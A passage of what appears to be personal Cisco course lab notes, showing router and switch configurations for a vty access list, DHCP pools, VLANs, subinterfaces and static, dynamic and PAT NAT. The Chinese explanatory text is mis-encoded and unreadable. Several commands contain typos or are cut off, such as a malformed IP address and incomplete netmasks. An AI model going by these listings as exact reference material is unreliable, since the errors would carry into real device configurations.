class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">99</span> permit host <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#line</span> vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config-line)</span></span><span class="hljs-number">#acc</span>ess-class <span class="hljs-number">99</span> i<br></code></pre></td></tr></table></figure><h2 id="8-1-3-3"><a href="#8-1-3-3" class="headerlink" title="8.1.3.3"></a>8.1.3.3</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp excluded-address <span class="hljs-number">192.168</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">10.10</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp excluded-address <span class="hljs-number">19</span>IP2.<span class="hljs-number">168.30</span>.<span class="hljs-number">1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">30.10</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp pool R1-LAN<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#network <span class="hljs-number">192.168</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#default-router <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#no default-router <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#default-router <span class="hljs-number">192.168</span>.<span class="hljs-number">10.1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#dns-server <span class="hljs-number">192.168</span>.<span class="hljs-number">20.254</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp pool R3-LAN<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#netw<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#network <span class="hljs-number">192.168</span>.<span class="hljs-number">30.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#dns<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#dns-server <span class="hljs-number">192.168</span>.<span class="hljs-number">20.254</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#def<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#default-router <span class="hljs-number">192.168</span>.<span class="hljs-number">30.1</span><br><br><br><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip dh<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip he<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip help<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip helper-address <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span><br><br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip help<br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip helper-address <span class="hljs-number">10.2</span>.<span class="hljs-number">2.2</span><br><br><span class="hljs-comment">//Step 1: Configure the Gigabit Ethernet 0/1 interface on R2 to receive IP addressing from DHCP and activate the interface.</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># interface g0/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip address dhcp<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># no shutdown<br></code></pre></td></tr></table></figure><h2 id="8-3-1-2"><a href="#8-3-1-2" class="headerlink" title="8.3.1.2"></a>8.3.1.2</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Sales<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Production<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Marketing<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">40</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> HR<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-vlan)</span></span>#ex<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> rang<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">5</span>-<span class="hljs-number">9</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">10</span>-<span class="hljs-number">14</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">15</span>-<span class="hljs-number">19</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#int</span> range f0/<span class="hljs-number">20</span>-<span class="hljs-number">24</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">40</span><br><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk <br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk <br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">4</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk<br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.240</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.128</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.40</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">40</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.31</span>.<span class="hljs-number">40.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.192</span><br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp pool VLAN_10<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#dns-server</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">201.14</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-number">#def</span>ault-router <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#network</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp pool VLAN_20<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#dns-server</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">201.14</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#network</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">20.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.240</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-number">#def</span>ault-router <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp pool VLAN_30<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#network</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.128</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-selector-id">#dns-server</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">201.14</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(dhcp-config)</span></span><span class="hljs-number">#def</span>ault-router <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span><br><br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">10.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">20.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">30.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> dhcp excluded-<span class="hljs-selector-tag">address</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">40.1</span> <span class="hljs-number">172.31</span>.<span class="hljs-number">40.10</span><br></code></pre></td></tr></table></figure><h2 id="ç¬¬ä¹ç« "><a href="#ç¬¬ä¹ç« " class="headerlink" title="ç¬¬ä¹ç« "></a>ç¬¬ä¹ç« </h2><h3 id="9-1-2-1-é™æ€nat"><a href="#9-1-2-1-é™æ€nat" class="headerlink" title="9.1.2.1 é™æ€nat"></a>9.1.2.1 é™æ€nat</h3><p>NAT è½¬æ¢æœ‰ä¸‰ç§ç±»å‹ï¼š</p><ul><li><p><strong>é™æ€åœ°å€è½¬æ¢ï¼ˆé™æ€ NATï¼‰</strong>- æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€ä¹‹é—´çš„ä¸€å¯¹ä¸€åœ°å€æ˜ å°„ã€‚</p></li><li><p><strong>åŠ¨æ€åœ°å€è½¬æ¢ï¼ˆåŠ¨æ€ NATï¼‰</strong>- æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€ä¹‹é—´çš„å¤šå¯¹å¤šåœ°å€æ˜ å°„ã€‚è½¬æ¢åœ¨å¯ç”¨çš„åŸºç¡€ä¸Šè¿›è¡Œï¼šä¾‹å¦‚ï¼Œå¦‚æœæœ‰ 100 ä¸ªå†…éƒ¨æœ¬åœ°åœ°å€å’Œ 10 ä¸ªå†…éƒ¨å…¨å±€åœ°å€ï¼Œåˆ™ä»»ä½•æ—¶å€™éƒ½åªèƒ½è½¬æ¢ 100 ä¸ªå†…éƒ¨æœ¬åœ°åœ°å€ä¸­çš„ 10 ä¸ªåœ°å€ã€‚åŠ¨æ€ NAT çš„è¿™ç§é™åˆ¶ä½¿å¾—å®ƒåœ¨ç”¨äºç”Ÿäº§ç½‘ç»œæ—¶æ²¡æœ‰ç«¯å£åœ°å€è½¬æ¢é‚£ä¹ˆå®ç”¨ã€‚</p></li><li><p><strong>ç«¯å£åœ°å€è½¬æ¢ (PAT)</strong> - æœ¬åœ°åœ°å€å’Œå…¨å±€åœ°å€ä¹‹é—´çš„å¤šå¯¹ä¸€åœ°å€æ˜ å°„ã€‚æ­¤æ–¹æ³•ä¹Ÿç§°ä¸ºè¿‡è½½ï¼ˆNAT è¿‡è½½ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæœ‰ 100 ä¸ªå†…éƒ¨æœ¬åœ°åœ°å€ä»¥åŠ 10 ä¸ªå†…éƒ¨å…¨å±€åœ°å€ï¼ŒPAT ä½¿ç”¨ç«¯å£ä½œä¸ºé™„åŠ å‚æ•°æ¥æä¾›ä¹˜æ•°æ•ˆåº”ï¼Œä»è€Œæ”¯æŒé‡å¤ä½¿ç”¨ 10 ä¸ªå†…éƒ¨å…¨å±€åœ°å€ä¸­çš„ä»»ä½•ä¸€ä¸ªåœ°å€ï¼Œé‡å¤æ¬¡æ•°é«˜è¾¾ 65,536 æ¬¡ï¼ˆè¿™å–å†³äºé€šä¿¡æµæ˜¯åŸºäº UDPã€TCP è¿˜æ˜¯ ICMPï¼‰ã€‚</p><p>  <strong>show ip nat translations</strong>ã€‚</p></li></ul><h3 id="9-2-1-4"><a href="#9-2-1-4" class="headerlink" title="9.2.1.4"></a>9.2.1.4</h3><p>Ip nat inside static <em>Inside_local_IP_address</em> <em>Inside_global_IP_address</em></p><p>Ip nat inside static <em>Outside_global_IP_address</em> <em>Outside_local_IP_address</em></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> nat inside source static <span class="hljs-number">172.16</span>.<span class="hljs-number">16.1</span> <span class="hljs-number">64.100</span>.<span class="hljs-number">50.1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> nat outside source static <span class="hljs-number">64.100</span>.<span class="hljs-number">50.1</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">128.130</span><br>(config)<span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> nat inside <br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> nat outside <br></code></pre></td></tr></table></figure><h3 id="9-2-2-2-é…ç½®åŠ¨æ€nat"><a href="#9-2-2-2-é…ç½®åŠ¨æ€nat" class="headerlink" title="9.2.2.2 é…ç½®åŠ¨æ€nat"></a>9.2.2.2 é…ç½®åŠ¨æ€nat</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527220001298.png" class="" title="image-20200527220001298"><h3 id="9-2-2-5"><a href="#9-2-2-5" class="headerlink" title="9.2.2.5"></a>9.2.2.5</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#access-<span class="hljs-built_in">list</span> <span class="hljs-number">1</span> permit <span class="hljs-number">172.16</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">255.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip nat pool DYNAMIC <span class="hljs-number">209.165</span>.<span class="hljs-number">76.196</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">76.199</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.</span><br><span class="hljs-comment">// Associate ACL1 with the NAT pool.</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip nat inside source <span class="hljs-built_in">list</span> <span class="hljs-number">1</span> pool DYNAMIC<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># interface s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat outside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># interface s0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br></code></pre></td></tr></table></figure><h3 id="9-2-3-1-é…ç½®PATï¼šåœ°å€æ± "><a href="#9-2-3-1-é…ç½®PATï¼šåœ°å€æ± " class="headerlink" title="9.2.3.1 é…ç½®PATï¼šåœ°å€æ± "></a>9.2.3.1 é…ç½®PATï¼šåœ°å€æ± </h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527231311081.png" class="" title="image-20200527231311081"><p><strong>overload</strong> å…³é”®å­—ä¼šå¯ç”¨ PATã€‚</p><h3 id="9-2-3-6"><a href="#9-2-3-6" class="headerlink" title="9.2.3.6"></a>9.2.3.6</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip access-<span class="hljs-built_in">list</span> standard R2NAT<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">std</span>-<span class="hljs-params">nacl</span>)</span># permit <span class="hljs-number">192.168</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">std</span>-<span class="hljs-params">nacl</span>)</span># permit <span class="hljs-number">192.168</span>.<span class="hljs-number">20.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">std</span>-<span class="hljs-params">nacl</span>)</span># permit <span class="hljs-number">192.168</span>.<span class="hljs-number">30.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><br><span class="hljs-comment">//ä½¿ç”¨åä¸º R2POOL çš„ NAT æ± é…ç½® R2ï¼Œè¯¥ NAT æ± ä½¿ç”¨ 209.165.202.128/30 åœ°å€ç©ºé—´ä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip nat pool R2POOL <span class="hljs-number">209.165</span>.<span class="hljs-number">202.129</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">202.129</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.</span><br><span class="hljs-comment">//å°†å‘½å ACL ä¸ NAT æ± ç›¸å…³è”ï¼Œå¹¶å¯ç”¨ PATã€‚</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip nat inside source <span class="hljs-built_in">list</span> R2NAT pool R2POOL overload<br><br><span class="hljs-comment">//ä½¿ç”¨ç›¸åº”çš„å†…éƒ¨å’Œå¤–éƒ¨ NAT å‘½ä»¤é…ç½® R2 æ¥å£ã€‚</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># inte fa0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># inte s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># inte s0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat inside<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># inte s0/<span class="hljs-number">1</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip nat outside<br><br><span class="hljs-comment">//è¯·å‚è€ƒæ‹“æ‰‘ç»“æ„ã€‚ åˆ›å»ºé™æ€ NAT è½¬æ¢ï¼Œä»¥å°† local.pka å†…éƒ¨åœ°å€æ˜ å°„è‡³å…¶å¤–éƒ¨åœ°å€</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># ip nat inside source static <span class="hljs-number">192.168</span>.<span class="hljs-number">20.254</span> <span class="hljs-number">209.165</span>.<span class="hljs-number">202.130</span><br></code></pre></td></tr></table></figure><h3 id="9-3-1-4"><a href="#9-3-1-4" class="headerlink" title="9.3.1.4"></a>9.3.1.4</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 